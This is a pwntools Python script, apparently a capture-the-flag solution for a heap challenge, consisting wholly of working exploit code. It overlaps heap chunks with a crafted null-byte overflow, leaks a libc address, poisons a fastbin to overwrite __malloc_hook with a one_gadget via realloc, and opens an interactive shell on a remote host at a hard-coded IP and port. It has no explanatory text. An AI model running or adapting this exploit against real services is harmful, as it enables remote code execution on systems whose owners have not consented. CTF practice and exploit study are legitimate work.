from pwn import *
context.binary = ELF('./babystack')
context.log_level = 'debug'
elf= context.binary
libc = elf.libc

def dbg():
	gdb.attach(p)

def menu(ch):
	p.sendlineafter('>>', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('size', str(size))
	p.sendlineafter('name', content)

def show(idx):
	menu(3)
	p.sendlineafter('index', str(idx))

def free(idx):
	menu(4)
	p.sendlineafter('index', str(idx))

def exploit():
	for i in range(2):
		add(0x100, 'a'*0x10)
	add(0x68, 'b')
	add(0x68, 'c')

	add(0x100, '\x00'*0xf0 + p64(0x100) + p64(0x11))
	free(2)
	free(3)
	free(0)

	add(0x68, 'a'*0x60 + p64(0x300))
	free(4)

	add(0x100, 'a'*0x10)
	show(1)
	p.recvline()
	libc_base = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - 0x3c4b78
	print "libc_base ==> ", hex(libc_base)
	libc.address = libc_base
	realloc_hook = libc.symbols['__realloc_hook']
	malloc_hook = libc.symbols['__malloc_hook']
	realloc = libc.symbols['realloc']
	
	print "malloc_hook ==> ", hex(malloc_hook)
	print "realloc ==> ", hex(realloc)

	free(0)
	add(0x100, 'a')
	add(0x100, 'b'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook-0x23))

	add(0x68, 'padding')
	#dbg()
	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	add(0x68, '\x00'*0xb + p64(gadgets[1] + libc.address) + p64(realloc+13))

	menu(1)
	p.sendlineafter('size', '18')
	p.interactive()
	p.close()


if __name__ == '__main__':
	p = remote('120.78.153.191', 22043)
	libc = ELF('./libc.so.6')
	elf= ELF('./babyheap')
	#p = elf.process()		#env={'LD_PRELOAD':'./libc.so.6'}
	exploit()